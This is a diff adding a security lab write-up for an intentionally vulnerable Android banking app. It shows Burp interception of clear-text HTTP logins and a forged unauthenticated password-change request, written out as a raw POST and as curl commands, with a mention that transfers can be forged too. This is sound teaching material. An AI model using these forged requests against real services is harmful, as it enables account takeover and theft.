@@ -103,3 +103,68 @@ CREATE TABLE android_metadata (locale TEXT);
 INSERT INTO android_metadata VALUES('en_US');
 COMMIT;
 ```
+
+
+### Task 1
+To solve all of the following tasks, Burp Suite was used to intercept all the
+traffic coming from the Android emulator. To do this, first install Burp. Open
+Burp and click the `Proxy` tab. Ensure that intercept is `on`. To make the app
+use Burp as a proxy, go into settings in the emulator and click the `proxy` tab.
+Enter the IP address of your computer and set the port to 8080, which is the
+default port used by Burp. Traffic should now go through Burp.
+
+What happens when you log in?
+1. What protocol is used?
+`HTTP`
+
+2. Is it encrypted?
+No. Only HTTP is used, not HTTPS.
+
+3. Can you see any sensitive data?
+Yes, username and password is sent in clear text.
+
+4. Can you identify other API endpoints?
+In the Transfer-menu:
+* `/getaccounts` when you press `Get Accounts`
+* `/dotransfer` when you press `Transfer`
+In the main menu:
+* `/changepassword` when you press `Change Password`
+
+Forging requests
+1. Can you change the password of `dinesh` without logging in first?
+Yes, there is no validation on the server to see if you are already logged in.
+We can simply send a POST request to `/changepassword` on the server with the
+expected parameters.
+From looking at intercepted requests in Burp, we know that the request looks
+like this:
+
+```
+POST /changepassword HTTP/1.1
+Content-Length: 48
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.1.105:8888
+Connection: close
+User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)
+
+username=<username>&newpassword=<password>
+```
+The easiest way to send a forged request is to click Action -> Send to repeater
+in Burp. This allows you to click on the `Repeater` tab, change the contents as
+you want, and send the modified request.
+
+You can also use curl like this:
+```bash
+$ curl -d "username=dinesh&newpassword=lol" http://192.168.1.105:8888/changepassword
+{"message": "Change Password Successful"}
+```
+And then verify that we can still log in:
+```bash
+$ curl -d "username=dinesh&password=lol" http://192.168.1.105:8888/login
+{"message": "Correct Credentials", "user": "dinesh"}
+```
+
+
+2. Any other requests you can forge?
+We can forge all requests to the server, as there's no checks in place to make
+sure that we are logged in. We could transfer money between two accounts, for
+example!
